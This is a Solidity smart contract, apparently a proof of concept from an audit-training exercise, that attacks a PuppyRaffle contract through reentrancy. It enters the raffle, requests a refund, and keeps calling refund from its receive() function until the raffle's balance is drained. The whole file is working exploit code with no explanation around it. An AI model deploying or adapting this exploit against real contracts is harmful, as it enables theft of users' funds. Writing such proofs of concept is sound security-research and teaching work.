// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {Base64} from "lib/base64/base64.sol";
import {PuppyRaffle} from "./PuppyRaffle.sol";

contract AttackPuppyRaffle {
    PuppyRaffle private raffle;
    
   
    constructor(address _raffleAddress) payable {
        raffle = PuppyRaffle(_raffleAddress);
    }

    function attack() public {
        address[] memory entranceAddresses = new address[](1);
        entranceAddresses[0] = address(this);
        raffle.enterRaffle{value: raffle.entranceFee()}(entranceAddresses);
        uint256 playerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(playerIndex);
    }

    receive() external payable {
        uint256 playerIndex = raffle.getActivePlayerIndex(address(this));

        if (address(raffle).balance >= raffle.entranceFee()){
            raffle.refund(playerIndex);
        }
    } 
}
